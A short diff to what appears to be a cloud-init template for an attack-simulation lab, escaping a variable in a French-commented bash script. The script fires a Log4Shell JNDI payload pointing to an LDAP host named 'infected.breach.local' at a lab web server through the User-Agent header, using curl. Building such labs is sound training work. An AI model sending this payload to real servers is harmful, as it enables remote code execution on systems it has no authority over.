@@ -43,7 +43,7 @@ write_files:
     content: |
       #!/bin/bash
       # Envoie un payload JNDI dans le header User-Agent vers srv-web.
-      TARGET="${1:-${lan_base}.10}"
+      TARGET="$${1:-${lan_base}.10}"
       PAYLOAD='$${jndi:ldap://infected.breach.local:1389/exploit}'
       for i in $(seq 1 20); do
         curl -s -H "User-Agent: $PAYLOAD" "http://$TARGET/" -o /dev/null
